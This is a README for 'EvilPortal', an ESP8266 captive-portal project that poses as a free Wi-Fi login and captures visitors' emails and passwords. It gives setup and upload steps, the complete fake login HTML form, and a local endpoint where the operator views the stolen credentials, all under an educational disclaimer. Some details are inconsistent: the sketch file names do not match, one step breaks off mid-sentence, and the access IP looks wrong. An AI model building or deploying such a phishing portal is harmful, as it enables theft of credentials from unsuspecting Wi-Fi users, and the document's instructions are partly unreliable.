# EvilPortal for ESP8266 (NodeMCU 1.0 - ESP-12E)

![ESP8266](https://img.shields.io/badge/Board-ESP8266%20NodeMCU%201.0-orange)
![Purpose](https://img.shields.io/badge/Purpose-Educational-blue)
![License](https://img.shields.io/badge/License-MIT-green)

---

## 📘 Description

**EvilPortal** is a lightweight captive portal project for the ESP8266 NodeMCU 1.0 (ESP-12E module), designed to simulate a Wi-Fi login page that captures credentials entered by users. This project is intended **strictly for educational and penetration testing training purposes only**.

Once deployed, the ESP8266 acts as a Wi-Fi access point. When a user connects, they are redirected to a fake login page (captive portal). Credentials entered on this page are captured and stored locally.

---

## ⚠️ Disclaimer

> **This project is intended for educational purposes only.**
>
> Do **not** use this on networks you do not own or have explicit written permission to test. Unauthorized use of this tool can be considered illegal and unethical.
>
> The developers are **not responsible for any misuse or damages** caused by using this software.

---

## 🧰 Features

- Captive portal for Wi-Fi login phishing
- Stores submitted credentials locally
- Simple OLED display support (optional)
- Captured credentials accessible via local endpoint

---

## 🛠 Hardware Requirements

- ESP8266 NodeMCU 1.0 (ESP-12E)
- Micro USB cable
- (Optional) OLED Display (I2C)

---

## 💻 Software Requirements

- [Arduino IDE](https://www.arduino.cc/en/software)
- ESP8266 board package installed via Boards Manager
- Required Arduino libraries:
  - `ESP8266WiFi.h`
  - `DNSServer.h`
  - `ESP8266WebServer.h`
  - `U8g2lib.h` (for OLED support)

---

## 📂 Project Structure

EvilPortal/
├── Evil_portal.ino // Main Arduino sketch
├── data/
│ └── index.html // Fake login page
└── creds.txt // File to store captured credentials




---

## 🚀 Installation & Upload

1. **Install Arduino IDE** and ESP8266 board support.
2. **Connect your ESP8266** via USB.
3. Select board:  
   `Tools > Board > NodeMCU 1.0 (ESP-12E Module)`
4. Select port:  
   `Tools > Port > COMx` (Windows) or `/dev/ttyUSBx` (Linux)
5. Install required libraries.
6. Upload `captive_portal.ino` using Arduino IDE.
7. If using a custom HTML page, upload it to SPIFFS via `ESP8266 Sketch Data Upload` tool.

---

## 📡 How It Works

1. The ESP8266 boots up and creates a Wi-Fi hotspot (e.g., SSID: `Free_WiFi`).
2. Any device connecting to it is redirected to a login page.
3. When the user submits credentials, they are stored in:
4. You can access the captured data via browser or serial monitor.

---

## 🔒 Access Captured Credentials

Once a user submits the form:

- The device logs the data to a local file or variable.
- Visit: `http://172.0.0.1/pass` from a connected device to view submitted credentials.

---

## 📜 Example Fake Login Page (index.html)

```html
<!DOCTYPE html>
<html>
<head>
<title>Wi-Fi Login</title>
</head>
<body>
<h2>Please log in to access the internet</h2>
<form action="/pass" method="POST">
 <label>Email:</label><br>
 <input type="email" name="email"><br>
 <label>Password:</label><br>
 <input type="password" name="password"><br><br>
 <input type="submit" value="Login">
</form>
</body>
</html>


